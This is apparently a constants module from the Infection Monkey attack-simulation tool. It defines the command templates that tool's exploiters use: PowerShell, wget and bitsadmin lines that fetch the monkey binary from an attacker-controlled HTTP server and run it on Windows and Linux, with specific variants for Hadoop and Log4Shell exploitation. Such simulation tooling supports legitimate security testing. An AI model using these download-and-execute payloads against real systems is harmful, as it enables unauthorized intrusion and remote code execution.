from infection_monkey.model.host import TargetHost, host_is_windows

MONKEY_ARG = "m0nk3y"
DROPPER_ARG = "dr0pp3r"
ID_STRING = "M0NK3Y3XPL0ITABLE"

# Username prefix for users created by Infection Monkey
USERNAME_PREFIX = "somenewuser"

# CMD prefix for windows commands
CMD_EXE = "cmd.exe"
CMD_CARRY_OUT = "/c"
CMD_PREFIX = CMD_EXE + " " + CMD_CARRY_OUT
DROPPER_CMDLINE_WINDOWS = "%s %%(dropper_path)s %s" % (
    CMD_PREFIX,
    DROPPER_ARG,
)
MONKEY_CMDLINE_WINDOWS = "%s %%(monkey_path)s %s" % (
    CMD_PREFIX,
    MONKEY_ARG,
)
DROPPER_CMDLINE_DETACHED_WINDOWS = "%s start cmd /c %%(dropper_path)s %s" % (
    CMD_PREFIX,
    DROPPER_ARG,
)
MONKEY_CMDLINE_DETACHED_WINDOWS = "%s start cmd /c %%(monkey_path)s %s" % (
    CMD_PREFIX,
    MONKEY_ARG,
)

# Commands used for downloading monkeys
POWERSHELL_HTTP_UPLOAD = (
    "powershell -NoLogo -Command \"Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%("
    "monkey_path)s' -UseBasicParsing\" "
)
WGET_HTTP_UPLOAD = "wget -O %(monkey_path)s %(http_path)s"
BITSADMIN_CMDLINE_HTTP = (
    "bitsadmin /transfer Update /download /priority high %(http_path)s %(monkey_path)s"
)
CHMOD_MONKEY = "chmod +x %(monkey_path)s"
RUN_MONKEY = "%(monkey_path)s %(monkey_type)s %(parameters)s"
# Commands used to check for architecture and if machine is exploitable
CHECK_COMMAND = "echo %s" % ID_STRING

HADOOP_WINDOWS_COMMAND = (
    "powershell -NoLogo -Command \"if (!(Test-Path '%(monkey_path)s')) { "
    "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing }; "
    " if (! (ps | ? {$_.path -eq '%(monkey_path)s'})) "
    '{& %(monkey_path)s %(monkey_type)s %(parameters)s }  "'
)
# The hadoop server may request another monkey executable after the attacker's HTTP server has shut
# down. This will result in wget creating a zero-length file, which needs to be removed. Using the
# `--no-clobber` option prevents two simultaneously running wget commands from interfering with
# eachother (one will fail and the other will succeed).
#
# If wget creates a zero-length file (because it was unable to contact the attacker's HTTP server),
# it needs to remove the file. It sleeps to minimize the risk that the file was created by another
# concurrently running wget and then removes the file if it is still zero-length after the sleep.
#
# This doesn't eleminate all race conditions, but should be good enough (in the short term) for all
# practical purposes. In the future, using randomized names for the monkey binary (which is a good
# practice anyway) would eleminate most of these issues.
HADOOP_LINUX_COMMAND = (
    "wget --no-clobber -O %(monkey_path)s %(http_path)s "
    "|| sleep 5 && ( ( ! [ -s %(monkey_path)s ] ) && rm %(monkey_path)s ) "
    "; chmod +x %(monkey_path)s "
    "&&  %(monkey_path)s %(monkey_type)s %(parameters)s"
)

LOG4SHELL_LINUX_COMMAND = (
    "wget -O %(monkey_path)s %(http_path)s ;"
    " chmod +x %(monkey_path)s ;"
    " %(monkey_path)s %(monkey_type)s %(parameters)s"
)

LOG4SHELL_WINDOWS_COMMAND = (
    'powershell -NoLogo -Command "'
    "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing; "
    ' %(monkey_path)s %(monkey_type)s %(parameters)s"'
)
DOWNLOAD_TIMEOUT = 180
